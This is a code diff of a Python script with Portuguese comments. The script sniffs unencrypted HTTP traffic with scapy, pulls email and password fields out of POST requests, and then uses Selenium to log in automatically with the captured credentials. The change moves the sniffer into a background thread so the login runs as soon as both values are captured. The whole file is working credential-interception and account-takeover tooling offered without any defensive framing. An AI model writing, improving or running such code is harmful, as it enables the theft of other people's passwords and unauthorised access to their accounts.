@@ -1,53 +1,60 @@
-from selenium import webdriver
-from webdriver_manager.firefox import GeckoDriverManager
-from selenium.webdriver.firefox.service import Service
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
+import threading
+import time
+
 from scapy.all import sniff, Raw
 from urllib.parse import unquote
 
-email = ''
-password = ''
+from selenium import webdriver
+from webdriver_manager.firefox import GeckoDriverManager
+from selenium.webdriver.common.by import By
+from selenium.webdriver.firefox.service import Service
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
 
-def processar(pacote):
+# VARIÁVEIS GLOBAIS
+email = None
+password = None
+
+
+# ----------------------------------------------------
+#   SNIFFER — roda em uma thread separada
+# ----------------------------------------------------
+def processar_pacotes(pacote):
     global email, password
+
     if pacote.haslayer(Raw):
         try:
             data = pacote[Raw].load.decode(errors="ignore").lower()
 
-            if "post" in data and ("email=" in data or "passwd=" in data):
+            if "post" in data:
 
-                print("\n[DADOS CAPTURADOS]")
-                print("-----------------------------------------")
-
-                # Extrai e decodifica o email
                 if "email=" in data:
-                    email_raw = data.split("email=", 1)[1].split("&")[0]
-                    email = unquote(email_raw)
-                    print(f"[EMAIL]  {email}")
+                    raw = data.split("email=", 1)[1].split("&")[0]
+                    email = unquote(raw)
+                    print(f"[EMAIL CAPTURADO] {email}")
 
-                # Extrai e decodifica a senha
                 if "passwd=" in data:
-                    pass_raw = data.split("passwd=", 1)[1].split("&")[0]
-                    password = unquote(pass_raw)
-                    print(f"[PASSWD] {password}")
+                    raw = data.split("passwd=", 1)[1].split("&")[0]
+                    password = unquote(raw)
+                    print(f"[SENHA CAPTURADA] {password}")
 
-                print("-----------------------------------------\n")
-
-        except Exception:
+        except:
             pass
+
+
+def iniciar_sniffer():
+    print("[*] Sniffer ativo — aguardando POSTs...")
+    sniff(filter="tcp port 80", prn=processar_pacotes, store=False)
 
 
 def expand_shadow(driver, element):
     return driver.execute_script('return arguments[0].shadowRoot', element)
 
-def main():
-    try:
-        global email, password
-        print("[*] Sniffer ativo. Aguardando POSTs decodificados...")
-        sniff(filter="tcp port 80", prn=processar, store=False)
+def realizar_login(email, password):
+    print("\n[*] Iniciando Selenium...")
+    print(f"[*] Tentando login com: {email} / {password}")
 
+    try:
         print(f"[*] Tentando login com email = {email} e senha = {password}")
 
         driver = webdriver.Firefox(service=Service(GeckoDriverManager().install()))
@@ -80,6 +87,25 @@ def main():
 
     except:
         print('[*] Login Failed')
+
+def main():
+    global email, password
+
+    # Inicia o sniffer em thread separada
+    thread_sniffer = threading.Thread(target=iniciar_sniffer, daemon=True)
+    thread_sniffer.start()
+
+    print("[*] Aguardando captura de email e senha...")
+
+    # Espera até que email E senha estejam capturados
+    while True:
+        if email and password:
+            print("[*] Credenciais completas capturadas!")
+            break
+        time.sleep(0.5)
+
+    # Assim que capturou → executa login automático
+    realizar_login(email, password)
 
 
 if __name__ == "__main__":
